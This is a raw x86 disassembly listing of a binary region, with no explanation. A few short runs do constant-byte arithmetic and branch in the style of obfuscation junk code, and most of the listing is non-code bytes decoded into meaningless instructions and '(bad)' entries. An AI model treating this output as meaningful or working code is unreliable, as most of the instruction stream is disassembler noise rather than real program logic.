  41d0ac:	sar    DWORD PTR [eax+eax*2+0x2474b8b2],1
  41d0b3:	and    al,0x9f
  41d0b5:	aam    0xd2
  41d0b7:	sub    eax,0xec57cc09
  41d0bc:	and    cl,BYTE PTR [esi]
  41d0be:	sbb    BYTE PTR [esi+0x7cfbe3ec],bh
  41d0c4:	jl     0x41d0fc
  41d0c6:	or     ch,ah
  41d0c8:	cmp    bl,0xb3
  41d0cb:	cli    
  41d0cc:	popf   
  41d0cd:	fisubr WORD PTR [edx]
  41d0cf:	ror    DWORD PTR [edx+0x2c38244c],0x56
  41d0d6:	movzx  eax,al
  41d0d9:	movzx  ecx,cl
  41d0dc:	cdq    
  41d0dd:	idiv   ecx
  41d0df:	movzx  ecx,BYTE PTR [esp+0x2c]
  41d0e4:	or     eax,ecx
  41d0e6:	mov    BYTE PTR [esp+0xc],al
  41d0ea:	mov    BYTE PTR [esp+0x24],0x1
  41d0ef:	mov    BYTE PTR [esp+0x2b],0xcf
  41d0f4:	mov    BYTE PTR [esp+0x3c],0x6
  41d0f9:	mov    BYTE PTR [esp+0x38],0x25
  41d0fe:	mov    BYTE PTR [esp+0x2c],0xf8
  41d103:	mov    al,BYTE PTR [esp+0x2c]
  41d107:	mov    cl,BYTE PTR [esp+0x38]
  41d10b:	or     al,0xc4
  41d10d:	and    al,cl
  41d10f:	mov    cl,BYTE PTR [esp+0x3c]
  41d113:	imul   cl
  41d115:	mov    cl,BYTE PTR [esp+0x2b]
  41d119:	movzx  ecx,cl
  41d11c:	movzx  eax,al
  41d11f:	and    eax,ecx
  41d121:	mov    cl,BYTE PTR [esp+0x24]
  41d125:	movzx  ecx,cl
  41d128:	cdq    
  41d129:	idiv   ecx
  41d12b:	mov    cl,BYTE PTR [esp+0xc]
  41d12f:	cmp    cl,al
  41d131:	je     0x41d926
  41d137:	lea    eax,[esp+0x9c]
  41d13e:	push   eax
  41d13f:	lea    edi,[esp+0x80]
  41d146:	call   0x40f356
  41d14b:	cmp    eax,ebx
  41d14d:	jmp    0x41d51c
  41d152:	lahf   
  41d153:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d154:	out    dx,eax
  41d155:	cdq    
  41d156:	out    dx,eax
  41d157:	inc    ecx
  41d158:	push   ds
  41d159:	push   ds
  41d15a:	mov    eax,0x3fbc6585
  41d15f:	sbb    edx,DWORD PTR [ecx+0x7e]
  41d162:	ss pop ebp
  41d164:	push   ss
  41d165:	sbb    BYTE PTR [edx+edx*1+0x53e71818],bh
  41d16c:	jmp    0x50c3:0xce7304f7
  41d173:	scas   eax,DWORD PTR es:[edi]
  41d174:	jo     0x41d143
  41d176:	dec    edx
  41d177:	pop    eax
  41d178:	cli    
  41d179:	lods   eax,DWORD PTR ds:[esi]
  41d17a:	imul   edx,DWORD PTR ds:[ecx-0x11],0xc992883a
  41d182:	and    eax,0x4e2860
  41d187:	add    DWORD PTR [edi+0x30c680bf],0xaf4f3fc7
  41d191:	cmp    ch,dl
  41d193:	add    eax,0x8c82a038
  41d198:	ins    BYTE PTR es:[edi],dx
  41d199:	sub    dl,BYTE PTR [esi+ecx*2+0x6aa2b283]
  41d1a0:	test   bl,al
  41d1a2:	and    BYTE PTR [ebx+esi*2+0x25],ch
  41d1a6:	add    BYTE PTR [ebx-0x47c3bfd4],bh
  41d1ac:	xor    BYTE PTR [ebx-0x6bfc9f6c],bl
  41d1b2:	je     0x41d137
  41d1b4:	ins    BYTE PTR es:[edi],dx
  41d1b5:	fistp  QWORD PTR ds:0x921b58b0
  41d1bb:	push   esi
  41d1bc:	pusha  
  41d1bd:	out    0x42,al
  41d1bf:	mov    ah,0x59
  41d1c1:	and    bh,BYTE PTR [ecx+0x634765b]
  41d1c7:	pop    edx
  41d1c8:	or     ah,BYTE PTR gs:[ecx]
  41d1cb:	sbb    al,0xd7
  41d1cd:	mov    BYTE PTR [ebp+0x57],ah
  41d1d0:	lea    ebx,[eax-0x79560895]
  41d1d6:	ja     0x41d23e
  41d1d8:	ret    0xd9c8
  41d1db:	mov    esp,ecx
  41d1dd:	and    DWORD PTR [ebp+0x77],esp
  41d1e0:	rol    cl,cl
  41d1e2:	outs   dx,BYTE PTR ds:[esi]
  41d1e3:	aas    
  41d1e4:	das    
  41d1e5:	pushf  
  41d1e6:	jg     0x41d1ae
  41d1e8:	pop    DWORD PTR [esi]
  41d1ea:	loope  0x41d188
  41d1ec:	mov    BYTE PTR cs:[edx],bh
  41d1ef:	jp     0x41d204
  41d1f1:	jno    0x41d215
  41d1f3:	cmp    eax,0x36118b18
  41d1f8:	fdivp  st(2),st
  41d1fa:	sbb    edi,eax
  41d1fc:	mov    BYTE PTR [ecx+ebp*8],bh
  41d1ff:	xor    DWORD PTR [esi],edi
  41d201:	and    eax,0x146c9d6b
  41d206:	sub    ebp,esp
  41d208:	daa    
  41d209:	(bad)  
  41d20a:	push   edx
  41d20b:	jecxz  0x41d1f6
  41d20d:	fcmovnb st,st(3)
  41d20f:	mov    edx,0x453c9958
  41d214:	pusha  
  41d215:	scas   eax,DWORD PTR es:[edi]
  41d216:	xor    DWORD PTR [edi+ebp*4],ecx
  41d219:	je     0x41d251
  41d21b:	xchg   esp,eax
  41d21c:	inc    ecx
  41d21d:	lea    edi,[ebx]
  41d21f:	iret   
  41d220:	push   0xf35f1fca
  41d225:	pop    ss
  41d226:	lock loope 0x41d1af
  41d229:	mov    ebp,0x4e3ab04
  41d22e:	dec    ecx
  41d22f:	push   edi
  41d230:	imul   edi,ecx,0xa8490891
  41d236:	xchg   edi,eax
  41d237:	shl    DWORD PTR [eax+0x4],0x9e
  41d23b:	scas   eax,DWORD PTR es:[edi]
  41d23c:	fsubr  QWORD PTR ds:0xcead3c2f
  41d242:	in     al,0x91
  41d244:	scas   eax,DWORD PTR es:[edi]
  41d245:	inc    ebp
  41d246:	in     eax,0x2e
  41d248:	outs   dx,DWORD PTR ds:[esi]
  41d249:	das    
  41d24a:	sti    
  41d24b:	pop    edx
  41d24c:	test   eax,0xfe23582c
  41d251:	daa    
  41d252:	lods   al,BYTE PTR ds:[esi]
  41d253:	pop    ebp
  41d254:	into   
  41d255:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d256:	pop    ebp
  41d257:	mov    al,0x4f
  41d259:	pop    ebp
  41d25a:	repz mov ebp,ebx
  41d25d:	pop    esi
  41d25e:	sti    
  41d25f:	push   ds
  41d260:	jns    0x41d213
  41d262:	dec    ebp
  41d263:	sbb    ecx,DWORD PTR [eax-0x6c]
  41d266:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d267:	fsubr  DWORD PTR [ecx-0x51]
  41d26a:	push   es
  41d26b:	xlat   BYTE PTR es:[ebx]
  41d26d:	(bad)  
  41d26f:	adc    bh,BYTE PTR [eax+0x3d]
  41d272:	dec    edi
  41d273:	sbb    eax,0xc72b4c24
  41d278:	xlat   BYTE PTR ds:[ebx]
  41d279:	mov    edx,0x3797d3e2
  41d27e:	ins    BYTE PTR es:[edi],dx
  41d27f:	ficomp WORD PTR [edx-0x6]
  41d282:	fild   DWORD PTR [edi-0x6cefe7bc]
  41d288:	and    BYTE PTR [ebx+0x2dc8223a],al
  41d28e:	retf   0xc909
  41d291:	or     bh,BYTE PTR [esi]
  41d293:	stos   DWORD PTR es:[edi],eax
  41d294:	jno    0x41d251
  41d296:	jae    0x41d285
  41d298:	sti    
  41d299:	mov    WORD PTR [edi],cs
  41d29b:	fldcw  WORD PTR ds:0x449dda29
  41d2a1:	stos   BYTE PTR es:[edi],al
  41d2a2:	gs sub edx,edi
  41d2a5:	pusha  
  41d2a6:	xor    esi,DWORD PTR [ebx-0x29]
  41d2a9:	pop    ebp
  41d2aa:	or     esp,DWORD PTR [ebx]
  41d2ac:	js     0x41d2b7
  41d2ae:	sbb    eax,0x3d895c4a
  41d2b3:	mov    eax,ds:0x799faf1a
  41d2b8:	hlt    
  41d2b9:	imul   eax,DWORD PTR [ebp-0x3c],0x98a11208
  41d2c0:	adc    BYTE PTR [edi],bl
  41d2c2:	pushf  
  41d2c3:	and    eax,0x21ea99ac
  41d2c8:	gs mov dh,0x3d
  41d2cb:	ja     0x41d2d8
  41d2cd:	xchg   ebx,eax
  41d2ce:	cmp    ch,BYTE PTR [edx-0x30e60549]
  41d2d4:	cmp    eax,edx
  41d2d6:	push   ecx
  41d2d7:	ins    BYTE PTR es:[edi],dx
  41d2d8:	cmp    al,BYTE PTR [ebx-0x15]
  41d2db:	mov    esi,0x7a07e0e1
  41d2e0:	rol    DWORD PTR [edx-0x25755ea],cl
  41d2e6:	aam    0xcd
  41d2e8:	push   ss
  41d2e9:	cmp    bh,ah
  41d2eb:	pop    ebp
  41d2ec:	data16 ins BYTE PTR es:[edi],dx
  41d2ee:	ret    0xf6ee
  41d2f1:	xchg   edx,eax
  41d2f2:	and    edi,DWORD PTR [edi-0x2fc916eb]
  41d2f8:	dec    esi
  41d2f9:	push   cs
  41d2fa:	daa    
  41d2fb:	mov    dl,0x7c
  41d2fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d2fe:	add    bh,dl
  41d300:	mov    dl,0x63
  41d302:	loop   0x41d383
  41d304:	loope  0x41d291
  41d306:	shl    DWORD PTR [ebp-0x6f],0x4f
  41d30a:	leave  
  41d30b:	push   0x3918b1fd
  41d310:	mov    esi,0x3e1e3a98
  41d315:	dec    esi
  41d316:	dec    eax
  41d317:	and    dl,cl
  41d319:	add    BYTE PTR [edi+0x5a],dl
  41d31c:	inc    ecx
  41d31d:	js     0x41d378
  41d31f:	mov    ss:0xe2316bbc,eax
  41d325:	mov    ah,0x66
  41d327:	pushf  
  41d328:	pop    ds
  41d329:	sub    al,0x42
  41d32b:	push   ds
  41d32c:	fcmovnb st,st(4)
  41d32e:	xchg   ebp,eax
  41d32f:	sub    al,0x98
  41d331:	repnz xchg edi,eax
  41d333:	popf   
  41d334:	xchg   ecx,eax
  41d335:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d336:	inc    eax
  41d337:	sub    esi,DWORD PTR [ecx]
  41d339:	push   edx
  41d33a:	or     al,0x49
  41d33c:	xlat   BYTE PTR ds:[ebx]
  41d33d:	fsub   DWORD PTR [edi+0x1fcbcc9e]
  41d343:	cli    
  41d344:	test   al,0xef
  41d346:	pop    esi
  41d347:	dec    eax
  41d348:	xor    eax,0xb0cafb2f
  41d34d:	or     DWORD PTR [ebp-0x181973e0],ebp
  41d353:	mov    BYTE PTR [eax-0x1de62078],al
  41d359:	dec    eax
  41d35a:	sub    DWORD PTR [esi-0x2a3e5d61],esp
  41d360:	push   ss
  41d361:	lods   eax,DWORD PTR ds:[esi]
  41d362:	push   eax
  41d363:	dec    eax
  41d364:	aad    0x91
  41d366:	add    BYTE PTR [edx+0x5efdaf36],0xd3
  41d36d:	stos   BYTE PTR es:[edi],al
  41d36e:	mov    dh,BYTE PTR [eax-0x5d]
  41d371:	stos   DWORD PTR es:[edi],eax
  41d372:	test   BYTE PTR [edi+ebp*4],0x8b
  41d376:	(bad)  
  41d377:	cmc    
  41d378:	and    BYTE PTR [edx],cl
  41d37a:	adc    BYTE PTR [esi+esi*1],bl
  41d37d:	cmp    al,0xe9
  41d37f:	jecxz  0x41d385
  41d381:	sbb    ecx,0x185b7837
  41d387:	pop    ebx
  41d388:	push   esp
  41d389:	xchg   edi,eax
  41d38a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d38b:	cdq    
  41d38c:	into   
  41d38d:	dec    edi
  41d38e:	fld    QWORD PTR [edi]
  41d390:	inc    edi
  41d391:	mov    ecx,0x371db5d1
  41d396:	inc    ebx
  41d397:	stc    
  41d398:	push   ss
  41d399:	into   
  41d39a:	js     0x41d3a7
  41d39c:	add    eax,0x6293c1f9
  41d3a1:	sub    BYTE PTR [eax-0x6c],bh
  41d3a4:	sbb    ch,BYTE PTR [esi]
  41d3a6:	xchg   edx,eax
  41d3a7:	stos   DWORD PTR es:[edi],eax
  41d3a8:	fucomip st,st(1)
  41d3aa:	cli    
  41d3ab:	arpl   bp,di
  41d3ad:	sub    ah,BYTE PTR [ebp+0xb]
  41d3b0:	scas   al,BYTE PTR es:[edi]
  41d3b1:	stos   BYTE PTR es:[edi],al
  41d3b2:	jmp    0x7559:0x78643024
  41d3b9:	jle    0x41d3fc
  41d3bb:	push   cs
  41d3bc:	js     0x41d3ba
  41d3be:	adc    al,BYTE PTR ds:0xfa11f36a
  41d3c4:	pop    edx
  41d3c5:	(bad)  [eax+0x7f5eabe3]
  41d3cb:	cs inc esp
  41d3cd:	lea    ecx,[edi]
  41d3cf:	pop    ax
  41d3d1:	fnclex 
  41d3d3:	(bad)  
  41d3d4:	mov    BYTE PTR [ecx-0x64],0xb6
  41d3d8:	sbb    al,0x7
  41d3da:	jmp    0xb704:0x31225467
  41d3e1:	mov    ecx,0x8bab63c5
  41d3e6:	adc    al,BYTE PTR [ebx+0x25145805]
  41d3ec:	sub    eax,0x801eb35f
  41d3f1:	jge    0x41d417
  41d3f3:	inc    BYTE PTR [edx-0x4a55dbd5]
  41d3f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d3fa:	sbb    al,ch
  41d3fc:	push   ds
  41d3fd:	mov    edi,0x763872d7
  41d402:	dec    edi
  41d403:	mov    dl,0xfa
  41d405:	test   BYTE PTR [edx+0x27],0xa7
  41d409:	mov    dl,0x2e
  41d40b:	and    ecx,DWORD PTR [edx-0x689a2c34]
  41d411:	jmp    0x51259c91
  41d416:	fsubrp st(3),st
  41d418:	mov    dl,0x48
  41d41a:	les    edi,FWORD PTR [edx-0x43]
  41d41d:	psubd  mm7,QWORD PTR [ebx]
  41d420:	push   ss
  41d421:	add    al,0x41
  41d423:	cmp    bl,dl
  41d425:	mov    ch,0xd1
  41d427:	fcmove st,st(5)
  41d429:	inc    ecx
  41d42a:	push   es
  41d42b:	xchg   ebp,eax
  41d42c:	cmp    edx,ebp
  41d42e:	sub    eax,0x3a131cf3
  41d433:	aas    
  41d434:	push   ecx
  41d435:	mul    DWORD PTR [edx+0x5e30b79d]
  41d43b:	mov    cs,WORD PTR [edx-0x1b]
  41d43e:	sti    
  41d43f:	aam    0x6b
  41d441:	js     0x41d3db
  41d443:	xchg   esi,eax
  41d444:	loop   0x41d438
  41d446:	inc    ecx
  41d447:	cld    
  41d448:	jecxz  0x41d475
  41d44a:	test   BYTE PTR [edx-0x1d83f6a0],bl
  41d450:	sub    DWORD PTR [ecx-0x59ecef54],esi
  41d456:	and    cl,BYTE PTR [ecx+edx*8]
  41d459:	push   es
  41d45a:	pop    ds
  41d45b:	push   esp
  41d45c:	pop    ebp
  41d45d:	pop    ebp
  41d45e:	jo     0x41d457
  41d460:	cmp    BYTE PTR [edx-0x4f064919],ah
  41d466:	stc    
  41d467:	iret   
  41d468:	outs   dx,DWORD PTR ds:[esi]
  41d469:	mov    BYTE PTR [edi],cl
  41d46b:	repz cs xchg esp,eax
  41d46e:	lods   eax,DWORD PTR ds:[esi]
  41d46f:	and    al,BYTE PTR [ebp+0x12d502b2]
  41d475:	dec    edx
  41d476:	adc    eax,0xa8a41883
  41d47b:	lods   al,BYTE PTR ds:[esi]
  41d47c:	and    eax,0x525222ed
  41d481:	and    ecx,DWORD PTR [eax+0x6bb62cb7]
  41d487:	(bad)  
  41d488:	pop    edx
  41d489:	add    DWORD PTR [ecx+0x654ffab3],esp
  41d48f:	es push es
  41d491:	xchg   ch,cl
  41d493:	aaa    
  41d494:	sub    esi,esi
  41d496:	or     ch,dl
  41d498:	cmovnp edx,DWORD PTR [edx-0x698de8f8]
  41d49f:	fistp  WORD PTR [ecx-0x4a60abf4]
  41d4a5:	mov    gs,esi
  41d4a7:	repz xchg ebp,eax
  41d4a9:	mov    edi,0x5f60f637
  41d4ae:	rcr    DWORD PTR [edx+0x17],1
  41d4b1:	and    BYTE PTR [eax+ebx*1-0x15],bh
  41d4b5:	push   ds
  41d4b6:	mov    bl,0x1f
  41d4b8:	mov    ds:0xc5749260,eax
  41d4bd:	daa    
  41d4be:	das    
  41d4bf:	add    al,0x75
  41d4c1:	rol    DWORD PTR [ebp-0x4f53ea3],1
  41d4c7:	add    al,0x2d
  41d4c9:	and    DWORD PTR [ebx-0x19],eax
  41d4cc:	push   eax
  41d4cd:	mov    al,ds:0xdeff4522
  41d4d2:	dec    ecx
  41d4d3:	mov    ?,WORD PTR [ebp+0x23]
  41d4d6:	aam    0x19
  41d4d8:	sub    eax,edx
  41d4da:	rcl    BYTE PTR [ecx+0x1e869c44],0x78
  41d4e1:	cmp    esi,DWORD PTR [ecx-0x3708288b]
  41d4e7:	push   es
  41d4e8:	push   es
  41d4e9:	scas   eax,DWORD PTR es:[edi]
  41d4ea:	adc    al,0xcd
  41d4ec:	arpl   WORD PTR [eax-0x62],ax
  41d4ef:	cmp    al,0x9
  41d4f1:	sar    BYTE PTR [ebp+ebp*1+0x6f623afd],1
  41d4f8:	jns    0x41d493
  41d4fa:	lods   al,BYTE PTR ds:[esi]
  41d4fb:	sbb    al,0xe1
  41d4fd:	popa   
  41d4fe:	jp     0x41d4d3
  41d500:	ret    
  41d501:	push   0x60
  41d503:	in     al,0x19
  41d505:	loope  0x41d55f
  41d507:	cmp    esp,DWORD PTR es:[esi]
  41d50a:	sti    
  41d50b:	xchg   edx,eax
  41d50c:	shr    DWORD PTR [ebp-0x2f],0x4f
  41d510:	push   eax
  41d511:	mov    WORD PTR [edi],?
  41d513:	je     0x41d547
  41d515:	xor    al,0x64
  41d517:	lods   al,BYTE PTR ds:[esi]
  41d518:	push   edi
  41d519:	push   esi
  41d51a:	fwait
  41d51b:	lds    ecx,FWORD PTR [edi]
  41d51d:	test   DWORD PTR [esp+eax*1],eax
  41d520:	add    BYTE PTR [eax],al
  41d522:	cmp    edx,esi
  41d524:	jne    0x41d926
  41d52a:	xor    eax,eax
  41d52c:	jmp    0x41e9f0
  41d531:	mov    eax,DWORD PTR [esp+0x70]
  41d535:	mov    ecx,DWORD PTR [esp+0x74]
  41d539:	jmp    0x41d908
  41d53e:	ss lahf 
  41d540:	xchg   ebp,eax
  41d541:	sbb    al,0x7c
  41d543:	sbb    bl,BYTE PTR [esi]
  41d545:	fwait
  41d546:	push   ebx
  41d547:	out    0xc5,eax
  41d549:	jl     0x41d4fa
  41d54b:	jno    0x41d528
  41d54d:	jle    0x41d529
  41d54f:	push   ebp
  41d550:	push   ss
  41d551:	sbb    BYTE PTR [edx+edx*1+0x7c271818],bh
  41d558:	and    edi,ecx
  41d55a:	pop    ss
  41d55b:	push   0x31040253
  41d560:	ins    DWORD PTR es:[edi],dx
  41d561:	pop    esi
  41d562:	ss pop esi
  41d564:	cli    
  41d565:	push   esp
  41d566:	jo     0x41d4ea
  41d568:	ins    BYTE PTR es:[edi],dx
  41d569:	cwde   
  41d56a:	sbb    dh,dl
  41d56c:	lahf   
  41d56d:	or     al,0x5f
  41d56f:	mov    ch,0x79
  41d571:	mov    ds:0x3843fe67,al
  41d576:	pop    ecx
  41d577:	daa    
  41d578:	fcomp  st(4)
  41d57a:	jns    0x41d51b
  41d57c:	or     DWORD PTR [esi],0x46
  41d57f:	lods   eax,DWORD PTR ds:[esi]
  41d580:	sub    BYTE PTR [esi-0x70],ch
  41d583:	inc    edi
  41d584:	sbb    dh,BYTE PTR [eax+0x6]
  41d587:	mov    al,0xcc
  41d589:	sbb    edi,esi
  41d58b:	and    al,0x1d
  41d58d:	adc    DWORD PTR [edx],ecx
  41d58f:	pop    es
  41d590:	or     al,0x70
  41d592:	(bad)  
  41d593:	jmp    0x41d51d
  41d595:	icebp  
  41d596:	aad    0x7a
  41d598:	ins    BYTE PTR es:[edi],dx
  41d599:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d59a:	sbb    BYTE PTR [eax],ah
  41d59c:	mov    eax,ds:0x27a76fa6
  41d5a1:	ja     0x41d601
  41d5a3:	push   ecx
  41d5a4:	jg     0x41d5e0
  41d5a6:	retf   0x1e58
  41d5a9:	mov    eax,ds:0xf6e05950
  41d5ae:	xchg   edi,ecx
  41d5b0:	pop    ecx
  41d5b1:	jmp    0x41d53e
  41d5b3:	sar    DWORD PTR [edx+eax*2-0x5b],cl
  41d5b7:	add    DWORD PTR [esi+0x40],0x6ed71290
  41d5be:	icebp  
  41d5bf:	div    BYTE PTR [edi-0x10]
  41d5c2:	aad    0x2f
  41d5c4:	pop    ds
  41d5c5:	addr16 mov edi,0x8323a201
  41d5cb:	xlat   BYTE PTR ds:[ebx]
  41d5cc:	xchg   ebp,eax
  41d5cd:	mov    bh,0xa3
  41d5cf:	xor    esi,DWORD PTR [ebx+0x4f]
  41d5d2:	fwait
  41d5d3:	jecxz  0x41d560
  41d5d5:	mov    edi,ecx
  41d5d7:	push   ecx
  41d5d8:	scas   eax,DWORD PTR es:[edi]
  41d5d9:	test   eax,0x5c513fa3
  41d5de:	mov    al,0xb7
  41d5e0:	or     bl,bl
  41d5e2:	cmp    eax,0xca6e2b45
  41d5e7:	dec    esp
  41d5e8:	pop    es
  41d5e9:	adc    dl,BYTE PTR [esi+0x1ba1adb2]
  41d5ef:	push   ebp
  41d5f0:	xchg   ebx,eax
  41d5f1:	scas   eax,DWORD PTR es:[edi]
  41d5f2:	imul   esi,ebp,0xfffffff7
  41d5f5:	fsubrp st(4),st
  41d5f7:	xor    eax,0xa3d540b7
  41d5fc:	jae    0x41d623
  41d5fe:	out    0xa6,al
  41d600:	pop    edx
  41d601:	clc    
  41d602:	mov    bh,0x66
  41d604:	and    bh,bl
  41d606:	mov    bl,0xe0
  41d608:	xor    BYTE PTR [esi+esi*8+0x587cf232],0x66
  41d610:	lods   eax,DWORD PTR ds:[esi]
  41d611:	mov    al,0x50
  41d613:	sub    bl,BYTE PTR [edx-0x4c]
  41d616:	cdq    
  41d617:	dec    ebp
  41d618:	dec    esp
  41d619:	dec    ebp
  41d61a:	xchg   esi,eax
  41d61b:	mov    dh,0x26
  41d61d:	cmp    DWORD PTR [ebp-0x4c],0xffffffcc
  41d621:	cmp    BYTE PTR [ebx+0x30],cl
  41d624:	push   esp
  41d625:	sub    dh,BYTE PTR [edx+ebp*2-0x5c]
  41d629:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d62a:	mov    ah,0x79
  41d62c:	xchg   edi,eax
  41d62d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d62e:	mov    ch,0xf3
  41d630:	aad    0x72
  41d632:	sahf   
  41d633:	imul   edi,DWORD PTR [eax-0x45],0x10a07009
  41d63a:	ins    DWORD PTR es:[edi],dx
  41d63b:	(bad)  
  41d63d:	jb     0x41d62f
  41d63f:	popa   
  41d640:	add    bh,BYTE PTR [ecx]
  41d642:	or     edi,esp
  41d644:	dec    eax
  41d645:	xchg   edi,eax
  41d646:	mov    eax,0xe3db7de9
  41d64b:	retf   0xb681
  41d64e:	jns    0x41d653
  41d650:	jns    0x41d684
  41d652:	mov    BYTE PTR [ebp+0x1000d7a1],bl
  41d658:	push   cs
  41d659:	xchg   BYTE PTR [edx-0x1c],dh
  41d65c:	in     eax,0xf4
  41d65e:	add    BYTE PTR [edi-0x2542388c],ch
  41d664:	mov    dl,0xec
  41d666:	fidivr WORD PTR [eax]
  41d668:	ja     0x41d6ae
  41d66a:	mov    esp,DWORD PTR [ecx-0x62ef35fb]
  41d670:	dec    eax
  41d671:	mov    esp,0x4992bde0
  41d676:	jp     0x41d609
  41d678:	cmp    DWORD PTR [ecx],edx
  41d67a:	sub    eax,0x9a40e86e
  41d67f:	cdq    
  41d680:	enter  0x7a79,0x5e
  41d684:	ror    DWORD PTR [eax+esi*8+0x8c9cbe5],1
  41d68b:	aad    0x39
  41d68d:	mov    eax,0x9a22ae93
  41d692:	add    al,0xcc
  41d694:	mov    dl,cl
  41d696:	icebp  
  41d697:	add    al,0xfb
  41d699:	mov    dh,0xae
  41d69b:	xchg   esp,eax
  41d69c:	rol    ebp,0xaa
  41d69f:	repz ja 0x41d709
  41d6a2:	pop    esi
  41d6a3:	pop    ebx
  41d6a4:	push   cs
  41d6a5:	dec    esp
  41d6a6:	jmp    edi
  41d6a8:	mov    es:0x5648eafb,eax
  41d6ae:	es out dx,eax
  41d6b0:	ror    DWORD PTR [esi-0x35],cl
  41d6b3:	jg     0x41d6de
  41d6b5:	mov    dh,0x3a
  41d6b7:	or     ebx,0x5b
  41d6ba:	or     BYTE PTR [edx-0x1c],al
  41d6bd:	mov    ecx,0xe6bc4df3
  41d6c2:	jle    0x41d66d
  41d6c4:	sbb    ebp,DWORD PTR [edi+0x4a2ed588]
  41d6ca:	aam    0xc9
  41d6cc:	cmp    esi,DWORD PTR [edi]
  41d6ce:	imul   esp,edi,0xe96c5317
  41d6d4:	nop
  41d6d5:	pop    ecx
  41d6d6:	adc    bh,BYTE PTR [ecx]
  41d6d8:	cmp    DWORD PTR [ecx],ebx
  41d6da:	sar    BYTE PTR [edx],cl
  41d6dc:	ss dec esi
  41d6de:	push   cs
  41d6df:	dec    esi
  41d6e0:	out    dx,al
  41d6e1:	add    DWORD PTR [ebx-0x5a],ecx
  41d6e4:	outs   dx,BYTE PTR ds:[esi]
  41d6e5:	repnz mov BYTE PTR [ebp+0x2f7954be],cl
  41d6ec:	sahf   
  41d6ed:	mov    dh,0x9c
  41d6ef:	jae    0x41d721
  41d6f1:	ds dec eax
  41d6f3:	stos   BYTE PTR es:[edi],al
  41d6f4:	fdiv   DWORD PTR [edi-0x2b]
  41d6f7:	mov    eax,0xe07926ae
  41d6fc:	fist   DWORD PTR [ecx+0x60]
  41d6ff:	inc    esi
  41d700:	stc    
  41d701:	inc    esi
  41d702:	push   ds
  41d703:	push   ss
  41d704:	stc    
  41d705:	xor    eax,0xb9d558f3
  41d70a:	dec    eax
  41d70b:	dec    esi
  41d70c:	dec    ebx
  41d70d:	rcl    bh,cl
  41d70f:	cmp    eax,0xa280f0fd
  41d714:	pop    edx
  41d715:	xchg   esi,eax
  41d716:	ja     0x41d75e
  41d718:	dec    edx
  41d719:	xchg   ecx,eax
  41d71a:	in     al,0x26
  41d71c:	mov    ds:0x6c80734c,eax
  41d721:	leave  
  41d722:	mov    ds:0xbb155aab,eax
  41d727:	mov    ds:0xdad71b56,eax
  41d72c:	call   0xaceedd9c
  41d731:	or     al,0xe9
  41d733:	and    BYTE PTR [ecx-0x2fb77cbc],0xd3
  41d73a:	dec    eax
  41d73b:	(bad)  
  41d73c:	repz pop ecx
  41d73e:	jge    0x41d6f9
  41d740:	fimul  WORD PTR [ebx]
  41d742:	je     0x41d759
  41d744:	jnp    0x41d76b
  41d746:	xchg   dl,ah
  41d748:	ins    DWORD PTR es:[edi],dx
  41d749:	jge    0x41d6d7
  41d74b:	sub    al,0x7
  41d74d:	sub    dl,BYTE PTR cs:[edi-0x2d2b3a91]
  41d754:	arpl   WORD PTR [edi+0x134baa2c],sp
  41d75a:	lahf   
  41d75b:	xor    bh,BYTE PTR ds:[ecx+0x65a9a671]
  41d762:	lods   eax,DWORD PTR ds:[esi]
  41d763:	mov    edx,0xee1ce1a7
  41d768:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d769:	adc    ch,BYTE PTR [ebx-0x6]
  41d76c:	lar    eax,WORD PTR [edx-0x2af743ba]
  41d773:	push   edi
  41d774:	add    esp,DWORD PTR [ebp+ecx*4-0x35]
  41d778:	in     al,0x32
  41d77a:	adc    DWORD PTR [edi-0x30],edx
  41d77d:	(bad)  
  41d77e:	loopne 0x41d78c
  41d780:	std    
  41d781:	(bad)  
  41d782:	in     eax,0x92
  41d784:	mov    al,0x6c
  41d786:	adc    edi,DWORD PTR [ebx-0x22]
  41d789:	push   edx
  41d78a:	repnz scas eax,DWORD PTR es:[edi]
  41d78c:	fidiv  DWORD PTR [eax]
  41d78e:	(bad)  
  41d790:	mov    cl,0xe8
  41d792:	xor    esp,DWORD PTR [ebx-0xd44063a]
  41d798:	pop    ss
  41d799:	aaa    
  41d79a:	popa   
  41d79b:	pop    ebp
  41d79c:	cmp    ebp,DWORD PTR [ebx-0x7c]
  41d79f:	fcmovnu st,st(7)
  41d7a1:	dec    ebx
  41d7a2:	gs jge 0x41d74f
  41d7a5:	sub    edi,DWORD PTR [ebx+0x2c39ebde]
  41d7ab:	xor    DWORD PTR [esi+0x135f49c2],esp
  41d7b1:	lea    edx,[eax]
  41d7b3:	sub    al,0x1f
  41d7b5:	call   0x6105:0x7bf94260
  41d7bc:	dec    eax
  41d7bd:	push   esi
  41d7be:	idiv   DWORD PTR [ecx-0x62]
  41d7c1:	add    eax,0x29005fc0
  41d7c6:	stos   BYTE PTR es:[edi],al
  41d7c7:	cmp    eax,0xa5892011
  41d7cc:	in     al,0xbd
  41d7ce:	or     BYTE PTR [edi-0x53],0x75
  41d7d2:	inc    esi
  41d7d3:	mov    cl,0xbe
  41d7d5:	aam    0xfc
  41d7d7:	das    
  41d7d8:	das    
  41d7d9:	xchg   esi,eax
  41d7da:	test   al,0x1b
  41d7dc:	and    DWORD PTR [ecx],edi
  41d7de:	jl     0x41d849
  41d7e0:	mov    eax,ds:0x34a8702b
  41d7e5:	jno    0x41d774
  41d7e7:	mov    bh,0xee
  41d7e9:	push   edi
  41d7ea:	mov    dh,0x48
  41d7ec:	(bad)  
  41d7ed:	or     ebp,DWORD PTR [esi+0x4e]
  41d7f0:	cld    
  41d7f1:	in     al,0xb9
  41d7f3:	outs   dx,BYTE PTR ds:[esi]
  41d7f4:	retf   0xc20f
  41d7f7:	dec    esi
  41d7f8:	ficomp DWORD PTR [ebp+edx*8-0x69]
  41d7fc:	cmp    cl,ah
  41d7fe:	pop    esi
  41d7ff:	in     al,dx
